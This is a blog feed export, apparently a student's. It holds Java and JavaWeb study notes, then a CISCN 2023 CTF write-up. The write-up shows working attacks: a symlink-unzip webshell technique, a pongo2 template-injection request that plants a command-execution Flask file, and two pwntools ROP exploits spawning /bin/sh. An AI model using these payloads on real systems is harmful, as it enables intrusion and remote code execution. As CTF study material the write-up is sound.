System.out.println(&quot;静态代码块&quot;);    &#125;    public sperson()&#123;//第三个输出        System.out.println(&quot;构造方法&quot;);    &#125;    public static void main(String[] args) &#123;        sperson foo = new sperson();        System.out.println(random());                    &#125;    /*    静态代码块    代码块（匿名代码块）    构造方法     */&#125;</code></pre><h2 id="抽象类和接口"><a href="#抽象类和接口" class="headerlink" title="抽象类和接口"></a>抽象类和接口</h2><p>普通类：只有具体实现</p><p>抽象类：具体实现和规范（抽象方法）都有</p><p>接口：只有规范</p><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><h4 id="abstract修饰符"><a href="#abstract修饰符" class="headerlink" title="abstract修饰符"></a>abstract修饰符</h4><p>可以用来修饰方法也可以修饰类</p><p>如果修饰方法，那么该方法就是抽象方法；</p><p>如果修饰类，那么该类就是抽象类</p><pre><code class="java">package oop.demo08;//abstract 抽象类     类：extends ：单继承   （接口可以多继承）public abstract class action &#123;    //abstract 抽象方法 只有方法名字，没用方法的实现！    public abstract void dosomething();    //1.不能实例化（new）,只能靠子类去实现，只能去约束    //2.抽象类中可以写普通方法    //3.抽象方法必须在抽象类中    //抽象的抽象：约束    //存在的意思，提高开发效率&#125;</code></pre><pre><code class="java">package oop.demo08;//抽象类的所有方法，继承了它的子类，必须要实现它的方法（public class A extends action&#123;    @Override    public void dosomething()&#123;    &#125;&#125;</code></pre><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><pre><code class="java">package oop.demo09;//interface 定义的关键词，接口都要有实现类public interface UserService &#123;    //属性：常量 public static final    int age = 99;//基本看不到，在接口中定义常量        //接口中的所有定义的方法都是抽象的 pbulic abstract        void add(String name);    void delete(String name);    void update(String name);    void query(String name);&#125;</code></pre><pre><code class="java">package oop.demo09;public interface Timeservice &#123;    void time();&#125;</code></pre><pre><code class="java">package oop.demo09;//类 可以实现接口 implments 接口//实现了接口的类,就需要重写接口中的方法public class UserServiceImpl implements UserService,Timeservice &#123;    @Override    public void add(String name) &#123;        // TODO Auto-generated method stub            &#125;    @Override    public void delete(String name) &#123;        // TODO Auto-generated method stub            &#125;    @Override    public void query(String name) &#123;        // TODO Auto-generated method stub            &#125;    @Override    public void update(String name) &#123;        // TODO Auto-generated method stub            &#125;    @Override    public void time() &#123;        // TODO Auto-generated method stub            &#125;    // @Overr\ide    &#125;</code></pre><pre><code class="java">package oop.demo08;//abstract 抽象类     类：extends ：单继承   （接口可以多继承）public abstract class action &#123;    //abstract 抽象方法 只有方法名字，没用方法的实现！    public abstract void dosomething();    //1.不能实例化（new）,只能靠子类去实现，只能去约束    //2.抽象类中可以写普通方法    //3.抽象方法必须在抽象类中    //抽象的抽象：约束    //存在的意思，提高开发效率&#125;</code></pre><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>约束</li><li>定义一些方法，让不同的人实现</li><li>pulic abstract，定义方法</li><li>public static final ，定义常量，很少用</li><li>接口不可以被实例化，接口没用构造方法</li><li>implements可以实现多个接口</li><li>必须重写接口中的方法</li></ol><h2 id="内部类及OOP实战"><a href="#内部类及OOP实战" class="headerlink" title="内部类及OOP实战"></a>内部类及OOP实战</h2><p>在一个类的内部在定义一个类</p><p>A类中定义一个B类，那么B类相对于A类就成为内部类，A类就是B类的外部类</p><h3 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h3><pre><code class="java">package oop.demo010;public class otuer &#123;    private int id = 231;    public void out()&#123;        System.out.println(&quot;这是一个外部类&quot;);    &#125;    public class Inner&#123;        public void in()&#123;            System.out.println(&quot;这是一个内部类&quot;);        &#125;        //获得外部类的私有属性        public void getID()&#123;            System.out.println(id);        &#125;    &#125;&#125;</code></pre><h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><p>内部类加关键词static</p><h3 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h3><pre><code class="java">   public void method()&#123;        class inner &#123;                    //这是一个局部内部类        &#125;    &#125;</code></pre><h3 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h3><p>不用将实例保存到变量中</p><pre><code class="java">new.test().eat();</code></pre><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="JavaSE"><a href="#JavaSE" class="headerlink" title="JavaSE"></a>JavaSE</h2><p>不如jvav</p><h1 id="JavaWeb"><a href="#JavaWeb" class="headerlink" title="JavaWeb"></a>JavaWeb</h1><h1 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h1><h2 id="1-1前言"><a href="#1-1前言" class="headerlink" title="1.1前言"></a>1.1前言</h2><p>web开发：</p><ul><li><p>web，网页的意思 ，<a href="http://www.baidu.com/">www.baidu.com</a></p></li><li><p>静态web</p><ul><li>html ，css </li><li>提供给所有人看的数据，始终不会发生变化</li></ul></li><li><p>动态web</p><ul><li>几乎所有网站</li><li>提供给所有人看的数据会发生变化，每个人在不同时间，不同地点看到的信息不同</li><li>技术栈：servlet&#x2F;JSP， ASP ,PHP</li></ul></li></ul><p>在java中，<strong>动态web资源开发</strong>统称为javaweb</p><h2 id="1-2-、web应用程序"><a href="#1-2-、web应用程序" class="headerlink" title="1.2 、web应用程序"></a>1.2 、web应用程序</h2><p>web应用程序：提供浏览器访问的程序</p><ul><li>a.html、b.html……多个web资源被访问提供服务</li><li>访问到的，一定存在</li><li>URL（统一资源定位符）</li><li>放在同一个文件夹下的所有web资源就是web应用程序，由Tomcat:服务器访问</li><li>web应用由多部分组成（静态，动态web<ul><li>html,css,js</li><li>jsp，servlet</li><li>java程序</li><li>jar包</li><li>配置文件（Properties</li></ul></li></ul><h2 id="1-3、静态web"><a href="#1-3、静态web" class="headerlink" title="1.3、静态web"></a>1.3、静态web</h2><ul><li><p><code>*.htm</code>,<code>*.html</code>服务器上存在就可以访问</p></li><li><p>https走的443端口，http走的80port</p><p><img src="/img/image-20240304212140844.png"></p></li><li><p>静态web的缺点</p><ul><li><p>无法更新，都是一个页面</p><ul><li>轮播图，点击特效，伪动态</li><li>js【实际最多】</li><li>VBScript</li></ul></li><li><p>无法和数据库交互（数据无法持久化</p></li></ul></li></ul><h2 id="1-4动态web"><a href="#1-4动态web" class="headerlink" title="1.4动态web"></a>1.4动态web</h2><p>页面动态展示</p><p><img src="/img/image-20240304212632534.png"></p><p>缺点</p><ul><li>web动态资源出现错误，需要重新编写后天程序</li></ul><p>优点</p><ul><li><p>可以更新，每人一个页面</p></li><li><p>可以和数据库交互（数据持久化：注册</p></li></ul><p><img src="/img/image-20240304212843519.png"></p><p>需要：<strong>分析原理，看源码</strong></p><h1 id="2-web服务器"><a href="#2-web服务器" class="headerlink" title="2.web服务器"></a>2.web服务器</h1><h2 id="2-1、技术开发"><a href="#2-1、技术开发" class="headerlink" title="2.1、技术开发"></a>2.1、技术开发</h2><p><strong>ASP:</strong></p><ul><li>微软：国内最早流行</li><li>HTML中嵌入VB脚本。ASP+COM</li><li>在ASP开发中，基本一个页面，html中嵌入java代码，页面混乱</li><li>混乱，维护成本高</li></ul><p><strong>php:</strong></p><ul><li>PHP开发速度快，功能强大，跨平台，代码简单</li><li>无法承载大访问量的情况（局限</li></ul><p><strong>JSP&#x2F;Servlet:</strong></p><p>B&#x2F;S：浏览和服务器</p><p>C&#x2F;S：客户端和服务段</p><ul><li>SUN公司主推的B&#x2F;S架构</li><li>基于Java（基本都是java写的）</li><li>承载三高问题（高并发。。</li><li>语法像ASP</li></ul><h2 id="2-2、web服务器"><a href="#2-2、web服务器" class="headerlink" title="2.2、web服务器"></a>2.2、web服务器</h2><p>服务器是一种被动的操作，用来处理用户的一些请求和给用户响应信息</p><p><strong>IIS</strong></p><p>微软的：ASP……Windows自带的</p><p><strong>Tomcat</strong></p><p>百度百科</p><blockquote><p>Tomcat是<a href="https://baike.baidu.com/item/Apache/6265?fromModule=lemma_inlink">Apache</a> 软件基金会（Apache Software Foundation）的<a href="https://baike.baidu.com/item/Jakarta/15952232?fromModule=lemma_inlink">Jakarta</a> 项目中的一个核心项目，由<a href="https://baike.baidu.com/item/Apache/6265?fromModule=lemma_inlink">Apache</a>、Sun 和其他一些公司及个人<a href="https://baike.baidu.com/item/%E5%85%B1%E5%90%8C%E5%BC%80%E5%8F%91/12674474?fromModule=lemma_inlink">共同开发</a>而成。由于有了Sun 的参与和支持，最新的Servlet 和<a href="https://baike.baidu.com/item/JSP/141543?fromModule=lemma_inlink">JSP</a> 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受<a href="https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink">Java</a> 爱好者的喜爱并得到了部分软件开发商的认可，成为比较流行的Web <a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/4971773?fromModule=lemma_inlink">应用服务器</a>。</p><p>Tomcat 服务器是一个免费的<a href="https://baike.baidu.com/item/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81/114160?fromModule=lemma_inlink">开放源代码</a>的<a href="https://baike.baidu.com/item/Web/150564?fromModule=lemma_inlink">Web</a> 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个java初学web的人来说，他是最佳的</p><p>，而Tomcat 实际上运行JSP  页面和Servlet。不过，Tomcat处理静态<a href="https://baike.baidu.com/item/HTML/97049?fromModule=lemma_inlink">HTML</a>的能力不如Apache服务器。Tomcat最新版本为10.0.23。</p></blockquote><p><strong>工作3-5后，尝试手写Tomcat服务器</strong></p><p>下载Tomcat</p><ol><li>安装</li><li>了解配置文件以及目录结构</li><li>作用</li></ol><h1 id="3、Tomcat"><a href="#3、Tomcat" class="headerlink" title="3、Tomcat"></a>3、Tomcat</h1><h2 id="3-1、下载"><a href="#3-1、下载" class="headerlink" title="3.1、下载"></a>3.1、下载</h2><p>官网 ：<a href="https://tomcat.apache.org/">https://tomcat.apache.org/</a></p><p>下载：<a href="https://tomcat.apache.org/download-11.cgi">https://tomcat.apache.org/download-11.cgi</a></p><h2 id="3-2、配置环境"><a href="#3-2、配置环境" class="headerlink" title="3.2、配置环境"></a>3.2、配置环境</h2><ol><li>配置环境变量： 新建系统变量CATALINA_HOME，其值为Tomcat解压后的路径，例如D:\apache-tomcat-9.0.56。</li><li>编辑系统变量Path，在Path的变量值中加入%CATALINA_HOME%\bin。</li></ol><h2 id="3-3、启动"><a href="#3-3、启动" class="headerlink" title="3.3、启动"></a>3.3、启动</h2><p><img src="/../../themes/3-hexo/source/img/image-20240305171714813.png" alt="image-20240305171714813"></p><p><strong>启动，关闭 Tomcat</strong></p><p>bin 目录下启动 startup.bat</p><h1 id="Stop"><a href="#Stop" class="headerlink" title="Stop"></a>Stop</h1><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p><strong>简化开发，为了解决企业级应用开的的复杂性而创建的</strong></p><p>IOC</p><p>AOP</p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
          <category> study </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN#2023</title>
      <link href="/2023/06/04/CISCN-2023/"/>
      <url>/2023/06/04/CISCN-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2023"><a href="#CISCN-2023" class="headerlink" title="CISCN#2023"></a>CISCN#2023</h1><p><strong>第一次参加国赛，纯纯坐牢</strong></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><p>复现环境在ctfshow</p><pre><code class="PHP">&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo = finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#39;application/zip&#39;)&#123;    exec(&#39;cd /tmp &amp;&amp; unzip -o &#39; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);&#125;;</code></pre><p>解释一下就是，文件上传并解压，但是会传到tmp文件夹执行</p><p>-o参数会覆盖已存在的文件，覆盖软连接的前提条件（有的解压缩不会覆盖原有的同名文件）</p><p>可以先传一个包含软连接的文件，</p><p>再传一个同名的带马的文件</p><p>会通过软链接覆盖把⻢解压到网站根目录</p><p><strong>软连接是linux中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接</strong></p><p>先linux下命令创建软连接文件并压缩</p><pre><code class="PHP">ln -s /var/www/html shell//创建一个软连接文件shellzip -y 1.zip shell//压缩shell到1.zip    </code></pre><p>上传1.zip，会解压里面的shell软连接到tmp下</p><p>这时候上传一个包含shell文件夹的压缩包</p><p>unzip后会把shell文件解压到tmp目录</p><p>而后shell软连接（第一次传的）会把第二次传的shell内的文件软连接到根目录并执行，可以放马拿shell</p><h3 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h3><p><a href="https://www.yuque.com/dat0u/ctf/va8lni12mn89zy7f">参考</a></p><pre><code class="Python">package routeimport (        &quot;github.com/flosch/pongo2/v6&quot;        &quot;github.com/gin-gonic/gin&quot;        &quot;github.com/gorilla/sessions&quot;        &quot;html&quot;        &quot;io&quot;        &quot;net/http&quot;        &quot;os&quot;)var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))func Index(c *gin.Context) &#123;        session, err := store.Get(c.Request, &quot;session-name&quot;)        if err != nil &#123;                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)                return        &#125;        if session.Values[&quot;name&quot;] == nil &#123;                session.Values[&quot;name&quot;] = &quot;guest&quot;                err = session.Save(c.Request, c.Writer)                if err != nil &#123;                        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)                        return                &#125;        &#125;        c.String(200, &quot;Hello, guest&quot;)&#125;func Admin(c *gin.Context) &#123;        session, err := store.Get(c.Request, &quot;session-name&quot;)        if err != nil &#123;                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)                return        &#125;        if session.Values[&quot;name&quot;] != &quot;admin&quot; &#123;                http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError)                return        &#125;        name := c.DefaultQuery(&quot;name&quot;, &quot;ssti&quot;)        xssWaf := html.EscapeString(name)        tpl, err := pongo2.FromString(&quot;Hello &quot; + xssWaf + &quot;!&quot;)        if err != nil &#123;                panic(err)        &#125;        out, err := tpl.Execute(pongo2.Context&#123;&quot;c&quot;: c&#125;)        if err != nil &#123;                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)                return        &#125;        c.String(200, out)&#125;func Flask(c *gin.Context) &#123;        session, err := store.Get(c.Request, &quot;session-name&quot;)        if err != nil &#123;                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)                return        &#125;        if session.Values[&quot;name&quot;] == nil &#123;                if err != nil &#123;                        http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError)                        return                &#125;        &#125;        resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;))        if err != nil &#123;                return        &#125;        defer resp.Body.Close()        body, _ := io.ReadAll(resp.Body)        c.String(200, string(body))&#125;</code></pre><p>三个路由</p><ul><li>Index</li><li>Admin</li><li>Flask</li></ul><p>先看Index路由，Index路由内容很简单，直接赋了个session，session中的name值为guest，这里发现session的key是通过SESSION_KEY环境变量获取的</p><p><img src="/img/image-20240311185237626.png"></p><p>再看Admin路由：</p><ul><li>这里对session做了验证，需要name为admin</li><li>这里用pongo2做模板渲染，存在模板渲染漏洞</li></ul><p><img src="/img/image-20240311185309516.png"></p><p>接着看Flask路由：</p><ul><li>Flask路由会请求靶机里5000端口服务，并把请求页面回显</li></ul><p><img src="/img/image-20240311185430139.png"></p><p>经过测试，得到以下结论：</p><ul><li>5000端口为python的flask服务，开启了debug模式，源码不存在ssti漏洞</li><li>session默认key为空，可以直接伪造admin用户</li></ul><p>flask源码可以通过让flask报错获取：</p><pre><code class="python">/flask?name=/</code></pre><p><img src="/img/image-20240311185641391.png"></p><p>本题正确思路如下：</p><ol><li>由于session默认key为空，伪造admin用户后可以调用Admin路由</li><li>Admin路由中存在pongo2模板注入漏洞，pongo2模板语法可以参考Django模板语法</li><li>通过Django模板注入覆盖&#x2F;app&#x2F;server.py文件，由于python服务是可以“热部署”的，因此覆盖恶意文件后，再通过Flask路由调用即可RCE</li></ol><p>再说一下错误思路：</p><ul><li>错误思路是利用pongo2模板语法读取算PIN所需的文件，计算出PIN后通过Flask路由请求&#x2F;console实现RCE，但是想在&#x2F;console中执行命令仅通过GET传参是无法完成验证的，并且后续执行代码请求都需要携带Cookie验证，所以这条路走不通</li></ul><p><img src="/img/image-20240311185659899.png"></p><p>首先获取一下admin用户的session：</p><ul><li>把下方代码加到route里，访问即可拿到伪造后的session</li></ul><pre><code class="go">func Key(c *gin.Context) &#123;    session, _ := store.Get(c.Request, &quot;session-name&quot;)    session.Values[&quot;name&quot;] = &quot;admin&quot;    session.Save(c.Request, c.Writer)    c.String(200, &quot;Hello, guest&quot;)&#125;</code></pre><p>admin用户的session如下：</p><pre><code>MTY4NTE2OTE4MHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzUn0khtUAglbEqre0c-3PmfQg0snOpUCSYyvq07U4AKw==</code></pre><p>接着构造请求包覆盖&#x2F;app&#x2F;server.py：</p><ul><li>注意name值需要url编码</li><li>c.HandlerName的值为<code>main/route.Admin</code>，接着用first过滤器获取到的就是<code>m</code>字符，用last过滤器获取到的就是<code>n</code>字符</li><li>注意GET请求也是可以使用表单上传文件的</li></ul><pre><code>/admin?name=&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py</code></pre><p>完整的HTTP请求</p><pre><code class="http">GET /admin?name=%7B%25set%20form%3Dc.Query(c.HandlerName%7Cfirst)%25%7D%7B%25set%20path%3Dc.Query(c.HandlerName%7Clast)%25%7D%7B%25set%20file%3Dc.FormFile(form)%25%7D%7B%7Bc.SaveUploadedFile(file%2Cpath)%7D%7D&amp;m=file&amp;n=/app/server.py HTTP/1.1Host: 970fe693-65cb-4674-8904-37a38a64cfd6.node.domain.com:9123Content-Length: 564Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqwT9VdDXSgZPm0ynCookie: session-name=MTY4NTE2OTE4MHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzUn0khtUAglbEqre0c-3PmfQg0snOpUCSYyvq07U4AKw==Connection: close------WebKitFormBoundaryqwT9VdDXSgZPm0ynContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;server.py&quot;Content-Type: image/jpegfrom flask import Flask, requestimport osapp = Flask(__name__)@app.route(&#39;/&#39;)def index():    name = request.args[&#39;name&#39;]    res = os.popen(name).read()    return res + &quot; no ssti&quot;if __name__ == &quot;__main__&quot;:    app.run(host=&quot;127.0.0.1&quot;, port=5000, debug=True)------WebKitFormBoundaryqwT9VdDXSgZPm0ynContent-Disposition: form-data; name=&quot;submit&quot;提交------WebKitFormBoundaryqwT9VdDXSgZPm0yn--</code></pre><p>接着访问Flask请求即可getshell</p><pre><code>/flask?name=?name=cat$&#123;IFS&#125;/t*</code></pre><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h2><p>静态链接和动态链接最直白的区别就是一个代码多一个代码少，因为静态是把所有的代码融合到一个可执行文件里面，而动态链接是将那些可能用不到的函数放到dll或者其他文件里</p><p><img src="/img/image-20240311184421923.png"></p><p>1,所以第一步发现这个文件很大，有很多东西猜测就是静态链接，静态链接就可以使用ROPgadget构建ropchian</p><pre><code class="Plain">ROPgadget --binary 文件名 --ropchain  生成一个rop</code></pre><p>函数调用关系简易，但函数居多，大概就是静态链接的</p><p><img src="/img/image-20240311184436007.png"></p><p>2.分析题目</p><p>（1）主函数里面有5个分支，分别是pijiu，chuan，yue，vip，gaiming，通过分析我们发现前面4个函数里面根本没有溢出点，在gaiming中才有一个read，但这个函数是需要条件才能进入的，就是需要在vip函数中用10000买下烧烤摊，初始只有233元，通过分析pijiu和chuan我们发现了整形溢出漏洞</p><p><img src="/img/image-20240311184449372.png"></p><p>3.所以整体的思路就是 整形溢出-&gt;计算溢出点-&gt;获取rop</p><p><img src="/img/image-20240311184502813.png"></p><p>点进去就能看到溢出的大小，</p><pre><code class="python">from pwn import *from struct import pack# p = remote(&#39;39.107.137.13&#39;,37284)sh = process(&#39;shaokao&#39;)sh.sendline(&#39;1&#39;)# pause()sh.sendline(&#39;3&#39;)sh.sendline(&#39;-500000&#39;)# pause()sh.sendline(&#39;3&#39;)# pause()sh.sendline(&#39;4&#39;)sh.sendline(&#39;5&#39;)p = b&#39;a&#39;*0x28p += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap += pack(&#39;&lt;Q&#39;, 0x0000000000458827) # pop rax ; retp += b&#39;/bin//sh&#39;p += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000040264f) # pop rdi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x00000000004a404b) # pop rdx ; pop rbx ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x4141414141414141) # paddingp += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscallsh.sendline(p)sh.interactive()</code></pre><p>法二：使用ret2syscall，前面步骤都是一样的，首先就是到溢出点，然后既然是静态链接，就很大概率包含了我们需要的所有rop片段（为了做这个我又学了一遍64位的syscall）</p><pre><code class="python">from pwn import *context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)sh = process(&#39;shaokao&#39;)sh.sendline(&#39;1&#39;)sh.sendline(&#39;3&#39;)sh.sendline(&#39;-500000&#39;)sh.sendline(&#39;3&#39;)sh.sendline(&#39;4&#39;)sh.sendline(&#39;5&#39;)rdi = 0x40264Frsi = 0x40A67Erax = 0x458827syscall = 0x402404data = 0x04E60F0rdx = 0x4A404Bp = b&#39;/bin/sh\x00&#39;.ljust(0x28,b&#39;a&#39;)+ p64(rax) + p64(59) + p64(rdi) + p64(data) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(0) + p64(syscall)sh.sendline(p)sh.interactive()</code></pre><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p><del>小学生编程器</del></p><p><a href="https://shimo.im/file-invite/n3tTF5DcSFoQNaHijyyJhd2NOGGN6/">https://shimo.im/file-invite/n3tTF5DcSFoQNaHijyyJhd2NOGGN6/</a> </p><p>1.首先使用浏览器打开这个文件，发现最上面有一个网站，直接访问，打开那个xml文件</p><p><img src="/img/image-20240311184534930.png"></p><p>2.首先点击右边的锁（加密函数），然后点击上面的按钮（步入），在这个一串数据上单击，使其步入到这个地方，然后右击数据，选择export，导出他的数据</p><p><img src="/img/image-20240311184545756.png"></p><p>3.前面是步骤，现在我来简单的描述一下他的加密步骤，</p><p>首先经过前面的函数，这几个东西除了secret都有了数据，经过这一串得到secret数据，至于数据的位置，在at后面，可以自己看一下，不重要，经过上面步入操作后，secret就有了数据</p><p><img 